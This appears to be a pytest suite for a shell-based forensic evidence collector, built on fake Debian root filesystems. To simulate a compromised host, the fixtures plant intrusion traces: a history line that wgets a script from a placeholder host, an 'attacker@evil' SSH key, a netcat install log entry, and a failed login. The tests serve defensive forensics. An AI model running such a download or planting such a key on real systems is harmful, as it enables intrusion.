"""Collector behavior tests.

Drive collector/collect.sh under both `sh` and `dash` against synthetic
fakeroot trees. Verifies: P1 fingerprint, P1b contamination record, P3
stat->copy->hash loop with degradation + missing recording, P5 seal, and
the never-abort rule.
"""
import csv
import json
import shutil
import subprocess
import tarfile
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
COLLECT_SH = REPO / "collector" / "collect.sh"

SHELLS = [s for s in ("sh", "dash") if shutil.which(s)]


def make_fakeroot(base: Path) -> Path:
    """A Debian-ish machine with the common artifacts present."""
    root = base / "fakeroot"
    (root / "etc").mkdir(parents=True)
    (root / "etc/os-release").write_text(
        'ID=debian\nVERSION_ID="12"\nPRETTY_NAME="Debian GNU/Linux 12"\n',
        encoding="utf-8",
    )
    (root / "etc/passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "alice:x:1000:1000::/home/alice:/bin/bash\n",
        encoding="utf-8",
    )
    (root / "etc/passwd-").write_text(
        "root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8"
    )
    (root / "etc/group").write_text("root:x:0:\nsudo:x:27:alice\n", encoding="utf-8")
    (root / "etc/group-").write_text("root:x:0:\n", encoding="utf-8")
    (root / "etc/hosts").write_text("127.0.0.1 localhost\n", encoding="utf-8")
    (root / "etc/resolv.conf").write_text("nameserver 9.9.9.9\n", encoding="utf-8")
    (root / "etc/crontab").write_text(
        "17 * * * * root cd / && run-parts /etc/cron.hourly\n", encoding="utf-8"
    )
    (root / "etc/sudoers").write_text("root ALL=(ALL:ALL) ALL\n", encoding="utf-8")
    (root / "etc/timezone").write_text("Asia/Karachi\n", encoding="utf-8")
    (root / "etc/machine-id").write_text("abcdef0123456789abcdef0123456789\n",
                                         encoding="utf-8")
    (root / "var/log").mkdir(parents=True)
    (root / "var/log/auth.log").write_text(
        "Mar 14 02:19:07 web1 sshd[123]: Failed password for admin "
        "from 203.0.113.9 port 40001 ssh2\n",
        encoding="utf-8",
    )
    (root / "var/log/auth.log.1").write_text("older line\n", encoding="utf-8")
    (root / "var/log/dpkg.log").write_text(
        "2024-03-10 02:30:01 install netcat:amd64 <none> 1.10\n", encoding="utf-8"
    )
    (root / "home/alice/.ssh").mkdir(parents=True)
    (root / "home/alice/.bash_history").write_text("wget http://x/a.sh\n",
                                                   encoding="utf-8")
    (root / "home/alice/.ssh/authorized_keys").write_text(
        "ssh-ed25519 AAAAC3Nza attacker@evil\n", encoding="utf-8"
    )
    return root


def _sh_path(p) -> str:
    """Windows C:\\x -> MSYS /c/x so Git Bash tar doesn't read C: as a
    remote-host prefix. No-op on POSIX paths."""
    s = str(p).replace("\\", "/")
    if len(s) > 1 and s[1] == ":":
        s = "/" + s[0].lower() + s[2:]
    return s


def run_collector(shell, root, outdir, *extra):
    cmd = [
        shell,
        str(COLLECT_SH),
        "-r", _sh_path(root),
        "-o", _sh_path(outdir),
        "-c", "CASE-T1",
        "-p", "pytest-operator",
        *extra,
    ]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=300)


@pytest.fixture(params=SHELLS, scope="module")
def collected(request, tmp_path_factory):
    base = tmp_path_factory.mktemp(f"collect_{request.param}")
    root = make_fakeroot(base)
    outdir = base / "out"
    proc = run_collector(request.param, root, outdir)
    assert proc.returncode == 0, proc.stderr
    return outdir


def read_manifest(outdir: Path) -> dict:
    return json.loads((outdir / "manifest.json").read_text(encoding="utf-8"))


def read_hashes(outdir: Path) -> list[dict]:
    with (outdir / "hash_manifest.csv").open(encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def test_p1_fingerprint_in_manifest(collected):
    m = read_manifest(collected)
    assert m["host"]["distro_id"] == "debian"
    assert m["host"]["version_id"] == "12"
    assert m["host"]["timezone"] == "Asia/Karachi"
    assert m["host"]["machine_id"] == "abcdef0123456789abcdef0123456789"
    assert m["case_id"] == "CASE-T1"
    assert m["operator"] == "pytest-operator"
    assert m["collection_start_utc"].endswith("Z")
    assert m["collection_end_utc"].endswith("Z")
    assert m["collector_version"]


def test_p1b_contamination_record(collected):
    m = read_manifest(collected)
    c = m["contamination"]
    assert c["operator_user"]
    assert str(c["pid"]).isdigit()


def test_p3_files_copied_and_hashed(collected):
    rows = read_hashes(collected)
    by_path = {r["original_path"]: r for r in rows}
    auth = by_path["/var/log/auth.log"]
    assert len(auth["sha256"]) == 64
    assert auth["status"] == "collected"
    copied = collected / "collected/files/var/log/auth.log"
    assert copied.exists()
    import hashlib

    assert hashlib.sha256(copied.read_bytes()).hexdigest() == auth["sha256"]
    # rotated variant collected via glob
    assert "/var/log/auth.log.1" in by_path
    # stat metadata captured
    assert auth["size"] == str(copied.stat().st_size)
    assert auth["mtime"].isdigit()


def test_glob_and_home_artifacts_collected(collected):
    by_path = {r["original_path"]: r for r in read_hashes(collected)}
    assert "/home/alice/.bash_history" in by_path
    assert "/home/alice/.ssh/authorized_keys" in by_path


def test_missing_required_recorded_not_fatal(collected):
    m = read_manifest(collected)
    missing_ids = {e["id"] for e in m["missing"]}
    # fakeroot has no /etc/localtime and no shadow; localtime is required
    assert "localtime" in missing_ids or any(
        e["path"] == "/etc/localtime" for e in m["missing"]
    )
    for entry in m["missing"]:
        assert entry["reason"]


def test_p5_bundle_sealed_and_hash_matches(collected):
    import hashlib

    tar_path = collected / "bundle.tar"
    assert tar_path.exists()
    recorded = (collected / "bundle.tar.sha256").read_text(encoding="utf-8").split()[0]
    assert hashlib.sha256(tar_path.read_bytes()).hexdigest() == recorded

    with tarfile.open(tar_path) as tf:
        names = tf.getnames()
    assert any("manifest.json" in n for n in names)
    assert any("hash_manifest.csv" in n for n in names)
    assert any("auth.log" in n for n in names)


def test_journald_absent_logged_and_continue(collected):
    m = read_manifest(collected)
    # fakeroot has no journal; collector must say so and still succeed
    assert m["journald"]["exported_boots"] == 0
    assert m["journald"]["persistent"] is False


@pytest.mark.parametrize("shell", SHELLS)
def test_never_abort_on_barren_root(shell, tmp_path):
    """A nearly-empty root must still produce a sealed bundle."""
    root = tmp_path / "barren"
    (root / "etc").mkdir(parents=True)
    (root / "etc/os-release").write_text("ID=alpine\nVERSION_ID=3.19\n",
                                         encoding="utf-8")
    outdir = tmp_path / "out"
    proc = run_collector(shell, root, outdir)
    assert proc.returncode == 0, proc.stderr
    assert (outdir / "bundle.tar").exists()
    m = read_manifest(outdir)
    assert m["missing"], "expected many missing artifacts recorded"


@pytest.mark.parametrize("shell", SHELLS)
def test_redact_mode_skips_shadow_content(shell, tmp_path):
    root = make_fakeroot(tmp_path)
    (root / "etc/shadow").write_text("root:$y$j9T$abc:19000:0:99999:7:::\n",
                                     encoding="utf-8")
    outdir = tmp_path / "out"
    proc = run_collector(shell, root, outdir, "-R")
    assert proc.returncode == 0, proc.stderr
    by_path = {r["original_path"]: r for r in read_hashes(outdir)}
    assert by_path["/etc/shadow"]["status"] == "redacted"
    assert not (outdir / "collected/files/etc/shadow").exists()


def test_dash_available_for_posix_strictness():
    assert "dash" in SHELLS, "dash must be installed for POSIX-strictness testing"
